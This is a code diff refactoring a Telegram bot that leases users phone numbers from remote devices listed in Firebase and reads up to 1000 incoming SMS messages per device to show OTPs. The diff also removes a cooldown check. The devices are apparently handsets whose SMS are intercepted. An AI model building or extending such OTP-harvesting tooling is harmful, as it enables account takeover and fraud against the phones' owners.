@@ -4,18 +4,13 @@ from aiogram.filters import CommandStart
 from aiogram.fsm.context import FSMContext
 import random, time
 import database as db
-import firebase_utils as fbu
+import services.firebase_service as fb_service
 from utils.ui import sc, btn
-from utils.helper import clear_user_lease, check_cooldown, get_countries, get_servers_grouped
+from utils.helper import clear_user_lease, get_countries, get_servers_grouped
+from keyboards.user_kb import main_kb
 from states import S
 
 user_router = Router()
-
-def main_kb():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [btn("get number", "user:get_num", "📱"), btn("my numbers", "user:saved", "⭐")],
-        [btn("otp history", "user:history", "📜"), btn("help/support", "user:support", "🆘")]
-    ])
 
 @user_router.message(CommandStart())
 async def cmd_start(msg: Message):
@@ -35,7 +30,6 @@ async def user_home(cq: CallbackQuery):
 
 @user_router.callback_query(F.data == "user:get_num")
 async def user_get_num(cq: CallbackQuery):
-    if not check_cooldown(cq.from_user.id): return await cq.answer("⏳ Wait 5 seconds!", show_alert=True)
     clear_user_lease(cq.from_user.id)
     d = db.load_data()
     countries = get_countries(d)
@@ -54,14 +48,13 @@ async def user_country(cq: CallbackQuery):
     
     kb = []
     for i, _ in enumerate(servers):
-        ping = await fbu.check_ping(servers[i][0]["url"])
+        ping = await fb_service.check_ping(servers[i][0]["url"])
         kb.append([btn(f"server {i+1} ({ping})", f"user:server:{country}:{i}", "📁")])
     kb.append([btn("back", "user:get_num", "🔙")])
     await cq.message.edit_text(f"🌍 {country} - <b>{sc('servers')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
 
 @user_router.callback_query(F.data.startswith("user:server:"))
 async def user_server(cq: CallbackQuery):
-    if not check_cooldown(cq.from_user.id): return await cq.answer("⏳ Wait 5 seconds!", show_alert=True)
     parts = cq.data.split(":")
     country, idx = parts[2], int(parts[3])
     uid = cq.from_user.id
@@ -79,7 +72,7 @@ async def user_server(cq: CallbackQuery):
     available, repeat, all_devs = [], [], []
     
     for fb_i, fb in enumerate(servers[idx]):
-        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
+        clients = await fb_service.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
         if not clients: continue
         for dev_id, c in clients.items():
             if isinstance(c, dict) and c.get("status") is True:
@@ -98,15 +91,15 @@ async def user_server(cq: CallbackQuery):
     data = db.load_data()
     data["used_devices"][str(uid)] = used
     
-    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=1000", fb.get("auth"))
+    msgs_dict = await fb_service.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=1000", fb.get("auth"))
     msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
     
     if msgs:
-        import core.scanner as scanner
+        import services.otp_service as scanner
         scanner.active_scans[(fb['url'], dev_id)] = max(int(m.get("id", 0)) for m in msgs)
     
-    best_nums = fbu.extract_best_numbers(dev_data, msgs)
-    health = fbu.calculate_health(msgs)
+    best_nums = fb_service.extract_best_numbers(dev_data, msgs)
+    health = fb_service.calculate_health(msgs)
     base_label = fb.get("label", f"Base {fb_i+1}")
     
     data["user_leases"][str(uid)] = {
@@ -199,7 +192,7 @@ async def user_access(cq: CallbackQuery):
         db.save_data(d)
         return await cq.answer("❌ 24 hours complete. Number expired.", show_alert=True)
         
-    clients = await fbu.fetch_fb(f"{info['fb_url']}/clients.json")
+    clients = await fb_service.fetch_fb(f"{info['fb_url']}/clients.json")
     if not (clients and info["dev_id"] in clients and clients[info["dev_id"]].get("status") is True):
         return await cq.answer("❌ Device offline or removed. Try after some time.", show_alert=True)
         
